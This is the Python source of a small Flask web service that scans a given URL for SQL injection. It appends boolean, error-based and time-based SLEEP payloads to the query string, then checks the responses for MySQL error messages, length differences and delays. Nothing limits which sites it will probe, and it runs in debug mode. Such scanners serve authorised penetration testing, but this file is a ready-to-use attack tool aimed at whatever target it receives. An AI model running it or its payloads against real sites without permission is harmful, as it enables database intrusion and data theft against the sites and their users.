from flask import Flask, request, Response
from flask_cors import CORS
import requests, time, json
from urllib.parse import quote
import re

app = Flask(__name__)
CORS(app)

# -------------------- Payloads --------------------
PAYLOADS = [
    # Boolean-based
    ("' OR '1'='1'", "Boolean True"),
    ("' OR '1'='2'", "Boolean False"),
    # Error-based
    ("'", "Error Based"),
    ("\")--", "Error Based"),
    ("' OR ''='", "Error Based"),
    ("'\"\"", "Error Based"),
    (";''", "Error Based"),
    # Time-based XOR / sleep
    ("XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))OR", "Time Based"),
    ("IF(NOW()=SYSDATE(),SLEEP(5),0)", "Time Based"),
    ("XOR(IF(NOW()=SYSDATE(),SLEEP(5),0) AND 1=1)", "Time Based"),
]

# -------------------- MySQL Error Signatures --------------------
MYSQL_ERROR_SIGS = [
    r"you have an error in your sql syntax",
    r"check the manual that corresponds to your mysql server version",
    r"warning: mysql",
    r"mysql_fetch",
    r"mysql_num_rows",
    r"mysql_fetch_array",
    r"mysql_fetch_assoc",
    r"mysql_fetch_object",
    r"mysql_result",
    r"mysql_fetch_row",
    r"mysql_",
    r"sql syntax.*mysql",
    r"valid mysql result",
    r"supplied argument is not a valid mysql",
    r"near .* at line \d+",
]

# -------------------- API --------------------
@app.route("/api/sqli", methods=["POST"])
def scan_sqli():
    data = request.get_json()
    target_url = data.get("url")
    if not target_url or "=" not in target_url:
        return {"error": "Invalid URL"}, 400

    def generate():
        for payload, ptype in PAYLOADS:
            encoded_payload = quote(payload)
            test_url = target_url + encoded_payload
            status = "Safe"

            try:
                start_time = time.time()
                response = requests.get(test_url, timeout=15)
                elapsed = time.time() - start_time
                body = response.text

                # --- Error-based detection (MySQL only) ---
                if any(re.search(sig, body, re.IGNORECASE) for sig in MYSQL_ERROR_SIGS):
                    status = "Error-based SQLi Detected"

                # --- Boolean-based detection ---
                elif ptype == "Boolean True":
                    false_url = target_url + quote("' OR '1'='2'")
                    r_false = requests.get(false_url, timeout=10).text
                    if len(r_false) != len(response.text):
                        status = "Possible Boolean SQLi"

                # --- Time-based detection ---
                elif "time based" in ptype.lower():
                    if elapsed >= 4:  # reduced threshold to catch slower servers
                        status = f"{ptype} Detected (Delay: {elapsed:.2f}s)"
                    else:
                        status = f"{ptype} Not Detected (Delay: {elapsed:.2f}s)"

            except Exception as e:
                status = f"Error: {str(e)}"

            result = {"payload": payload, "url": test_url, "status": status, "type": ptype}
            yield json.dumps(result) + "\n"
            time.sleep(0.3)

        yield json.dumps({"done": True}) + "\n"

    return Response(generate(), mimetype="text/plain")


if __name__ == "__main__":
    app.run(port=5000, threaded=True, debug=True)
